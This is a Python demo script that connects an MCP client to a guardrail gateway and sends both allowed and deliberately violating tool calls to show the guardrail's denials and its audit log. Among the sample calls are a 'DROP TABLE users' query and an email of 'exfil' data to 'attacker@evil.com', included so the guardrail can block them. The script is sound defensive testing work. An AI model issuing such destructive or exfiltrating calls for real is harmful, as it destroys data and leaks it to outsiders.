"""End-to-end demo: an MCP client driving the policy-enforcing gateway.

Plays the role the LangGraph agent will play in Phase 5. It launches the gateway
as the `support-agent` role and makes a mix of legitimate and policy-violating
calls, so you can watch the guardrail allow some and deny others - then it prints
the audit trail.

Run with:
    python scripts/run_agent_demo.py
(Uses SQLite unless DATABASE_URL is set, so it works without Docker.)
"""

from __future__ import annotations

import asyncio
import os
import sys

from mcp.client.session import ClientSession
from mcp.client.stdio import StdioServerParameters, stdio_client

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from guardrail.audit import get_audit_log  # noqa: E402

# The calls we'll make. Each is (tool, arguments, why-it's-interesting).
DEMO_CALLS = [
    ("query_database", {"query": "SELECT * FROM users LIMIT 2"}, "allowed: read-only"),
    ("query_database", {"query": "DROP TABLE users"}, "DENIED: mutating query"),
    ("send_email", {"to": "ada@example.com", "subject": "Hi", "body": "Internal note."},
     "allowed: internal recipient"),
    ("send_email", {"to": "attacker@evil.com", "subject": "data", "body": "exfil"},
     "DENIED: external recipient"),
    ("issue_refund", {"customer": "ada@example.com", "amount": 30, "reason": "late"},
     "allowed: within per-call cap"),
    ("issue_refund", {"customer": "ada@example.com", "amount": 9999, "reason": "oops"},
     "DENIED: over per-call cap"),
]


def gateway_params() -> StdioServerParameters:
    env = dict(os.environ)
    env.setdefault("GUARDRAIL_AGENT_ID", "demo-agent")
    env.setdefault("GUARDRAIL_AGENT_ROLE", "support-agent")
    return StdioServerParameters(
        command=sys.executable, args=["-m", "guardrail.gateway.server"], env=env
    )


async def main() -> None:
    print("Connecting to gateway as role=support-agent...\n")
    async with stdio_client(gateway_params()) as (read, write):
        async with ClientSession(read, write) as session:
            await session.initialize()

            tools = {t.name for t in (await session.list_tools()).tools}
            print(f"Tools available: {', '.join(sorted(tools))}\n")

            for tool, args, note in DEMO_CALLS:
                result = await session.call_tool(tool, args)
                reply = result.content[0].text.splitlines()[0]
                print(f"* {tool}({_fmt(args)})")
                print(f"    expected {note}")
                print(f"    -> {reply}\n")

    print("--- Audit trail ---")
    audit = get_audit_log()
    for row in audit.all_rows():
        if row["event_type"] == "request":
            print(f"  #{row['id']} request  {row['tool_name']}")
        elif row["event_type"] == "decision":
            print(f"  #{row['id']} decision {row['decision'].upper():5} "
                  f"({row['decision_rule']}) - {row['decision_reason']}")
        else:
            print(f"  #{row['id']} outcome  {row['outcome']}")
    audit.close()


def _fmt(args: dict) -> str:
    return ", ".join(f"{k}={v!r}" for k, v in args.items())


if __name__ == "__main__":
    asyncio.run(main())
